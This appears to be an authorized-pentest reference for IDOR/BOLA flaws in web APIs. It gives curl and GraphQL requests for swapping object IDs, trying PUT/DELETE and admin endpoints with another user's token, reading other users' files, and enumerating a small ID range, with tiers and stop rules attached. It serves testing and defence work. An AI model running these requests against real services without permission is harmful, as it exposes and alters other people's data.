# IDOR/BOLA Payload

> ⚠️ **Security Boundary Statement**
>
> This document is for **authorized penetration testing reference** only, helping identify IDOR (Insecure Direct Object Reference) / BOLA (Broken Object Level Authorization) vulnerability risk characteristics.
>
> - All payloads are **technical principle demonstrations**, actual unauthorized access is prohibited
> - IDOR payloads are for understanding attack surface only, **no access to other users' private data**
> - Validation proves vulnerability existence (access check missing), **no mass data enumeration**
> - See `SKILL.md` for specific execution boundaries
>
> **Core Principle**: Prove existence, do not enable harm

---

## Source: OWASP API Security Top 10, PayloadsAllTheThings

## Manual Testing

**Note: IDOR/BOLA is OWASP API Security #1 - most common API vulnerability**

---

## Validation Objectives (Within Security Boundary)

IDOR vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Horizontal IDOR (single object) | ✓ Access one other user's public object | - | Access private data |
| Horizontal IDOR (mass) | ❌ Not by default | ✓ Requires explicit authorization | Enumerate all users' data |
| Vertical IDOR | ✓ Verify function exists | ✓ Execute admin action | Perform actual admin operations |
| IDOR via HTTP Methods | ✓ Test different methods | - | Modify/delete other users' data |
| IDOR via Parameters | ✓ Identify vulnerable parameter | - | Exploit for data harvest |

**Safe Validation Method**: Test access to one or two other objects to prove authorization check missing; do not enumerate mass data.

---

## Validation Tier Classification

This payload file uses a **tiered validation approach**:

| Tier | Description | Authorization |
|------|-------------|---------------|
| **Tier 1: Safe Validation** | Single object access test, function existence verification | No authorization needed |
| **Tier 2: Authorized Extended** | Mass enumeration, admin action execution | User explicit authorization required |
| **Tier 3: Theory Reference** | Exploitation concepts, data harvest scenarios | For understanding only, do not execute |

**Default execution**: Only Tier 1 methods.
**Stop condition**: After confirming authorization check is missing (one successful unauthorized access).

---

## IDOR Types

### Horizontal IDOR (Same Role, Different User)

Access other users' data at the same permission level.

```text
User A (normal) -> User B's data (normal)
Example: /api/users/1001 -> /api/users/1002 (access other user's profile)
```

### Vertical IDOR (Different Role)

Access higher privilege functions or data.

```text
User A (normal) -> Admin function
Example: /api/admin/users (normal user accessing admin endpoint)
```

### IDOR via HTTP Methods

Different HTTP methods may have different authorization checks.

```text
GET /api/orders/8899     -> May be protected
PUT /api/orders/8899     -> May be unprotected
DELETE /api/orders/8899  -> May be unprotected
```

---

## IDOR Test Patterns

### 1. Direct Object Reference (ID Parameter)

**Tier 1: Safe Validation**

```bash
# Login as user A, get own resource
curl -X GET "https://api.example.com/v1/users/1001" \
     -H "Authorization: Bearer <user_A_token>"

# Try accessing user B's resource (increment/decrement ID)
curl -X GET "https://api.example.com/v1/users/1002" \
     -H "Authorization: Bearer <user_A_token>"

# Expected: 403 Forbidden
# Vulnerable: 200 OK with user B's data
```

**Stop**: If vulnerable, document existence. Do not enumerate more IDs.

### 2. GUID/UUID IDOR

```bash
# GUID may still be predictable or leaked
curl -X GET "https://api.example.com/v1/orders/a1b2c3d4-e5f6-7890" \
     -H "Authorization: Bearer <token>"

# Try known GUID from other source (error message, logs, shared link)
curl -X GET "https://api.example.com/v1/orders/<known_other_guid>" \
     -H "Authorization: Bearer <token>"
```

### 3. Parameter-Based IDOR

```bash
# User ID in query parameter
curl -X GET "https://api.example.com/v1/profile?user_id=1002" \
     -H "Authorization: Bearer <user_A_token>"

# User ID in JSON body
curl -X POST "https://api.example.com/v1/orders" \
     -H "Authorization: Bearer <user_A_token>" \
     -H "Content-Type: application/json" \
     -d '{"user_id": 1002, "product_id": 101}'
```

### 4. HTTP Method Variation

**Tier 1: Safe Validation (Read Only)**

```bash
# Test different HTTP methods on same endpoint
# GET may be protected, but PUT/DELETE may not

# Read other user's resource (safe)
curl -X GET "https://api.example.com/v1/orders/8899" \
     -H "Authorization: Bearer <other_user_token>"

# If GET works, try PUT (requires authorization)
curl -X PUT "https://api.example.com/v1/orders/8899" \
     -H "Authorization: Bearer <other_user_token>" \
     -d '{"status": "CANCELLED"}'

# DELETE (requires authorization)
curl -X DELETE "https://api.example.com/v1/orders/8899" \
     -H "Authorization: Bearer <other_user_token>"
```

**Note**: PUT/DELETE cause actual state change - require user authorization.

### 5. Vertical IDOR (Admin Function Access)

**Tier 1: Safe Validation (Function Existence Check)**

```bash
# Test if admin endpoint exists and accessible
curl -X GET "https://api.example.com/v1/admin/users" \
     -H "Authorization: Bearer <normal_user_token>"

# Expected: 403 Forbidden or 404 Not Found
# Vulnerable: 200 OK with user list
```

**Tier 2: Authorized Extended (Action Execution)**

```bash
# Execute admin action - requires authorization
curl -X POST "https://api.example.com/v1/admin/users/1002/delete" \
     -H "Authorization: Bearer <normal_user_token>"
```

---

## IDOR in File Access

### File Path IDOR

```bash
# Access other user's file by path
curl -X GET "https://api.example.com/v1/files/user_b/report.pdf" \
     -H "Authorization: Bearer <user_A_token>"

# Access by file ID
curl -X GET "https://api.example.com/v1/files/12345" \
     -H "Authorization: Bearer <user_A_token>"
```

### File Upload IDOR

```bash
# Upload to other user's folder - requires authorization
curl -X POST "https://api.example.com/v1/files/upload?user_id=1002" \
     -H "Authorization: Bearer <user_A_token>" \
     -F "file=@test.txt"
```

---

## IDOR in GraphQL

**Tier 1: Safe Validation**

```graphql
# Query other user's data via GraphQL
query {
  user(id: 1002) {
    username
    email
    # Try sensitive fields
    phone
    address
  }
}

# Vulnerable: Returns user 1002's data with user A's token
```

---

## Mass IDOR (Requires Authorization)

**⚠️ IMPORTANT**: Mass enumeration is NOT a default validation step.

**Authorization Requirements**:
1. User explicitly authorizes mass enumeration in writing
2. Limit enumeration scope (e.g., max 10-20 objects for proof)
3. Document enumeration count in report
4. Mark "Mass IDOR executed with user authorization"

**Tier 2: Authorized Extended (Theory Reference)**

```bash
# Mass enumeration - requires authorization
for i in {1000..1020}; do
  curl -s "https://api.example.com/v1/users/$i" \
       -H "Authorization: Bearer <token>" | jq '.email'
done

# Stop at limited range for proof, do not harvest full dataset
```

---

## Analysis Process

### Tier 1: Default Validation

1. Identify object reference parameters (ID, GUID, path, filename)
2. Create two test accounts (User A, User B) or use known IDs
3. Login as User A, access User A's own resource
4. Try accessing User B's resource with User A's token
5. Test different HTTP methods (GET -> PUT -> DELETE)
6. Test parameter variations (path, query, body)
7. **Stop validation**, document authorization check missing

### Tier 2: Authorized Extended (Requires Authorization)

8. Mass enumeration (limited scope for proof)
9. Admin action execution (vertical IDOR exploitation)

---

## Severity Classification

| IDOR Type | Default Severity | Adjustment Criteria |
|-----------|------------------|---------------------|
| Single object read | Medium | Private data -> High |
| Single object modify | High | Causes actual impact |
| Mass enumeration capable | High | Requires auth for mass test |
| Admin function access | High | Critical if action execution confirmed |
| File access (read) | Medium | Sensitive file -> High |
| File access (write/delete) | High | Causes data loss/modification |

---

## Output

```markdown
## Vulnerability: IDOR/BOLA

### Location
{URL} - {parameter name}

### IDOR Type
{Horizontal / Vertical / HTTP Method Variation}

### Proof Payload
GET /api/users/1002 (with user_A_token)

### Validation Result
- Own resource (1001): 200 OK
- Other's resource (1002): 200 OK (vulnerable)
- Expected: 403 Forbidden

### Risk Level
{Medium/High} - Authorization check missing, can access other users' data
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Mass data enumeration | Do not enumerate all users without authorization |
| ❌ Access private data | Do not read sensitive private information |
| ❌ Modify other's data | Do not execute PUT/DELETE without authorization |
| ❌ Delete other's files | Do not cause data loss |
| ❌ Admin action execution | Do not perform actual admin operations |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Prove existence, do not enable harm"
- `templates/severity-classification.md` -> IDOR severity rules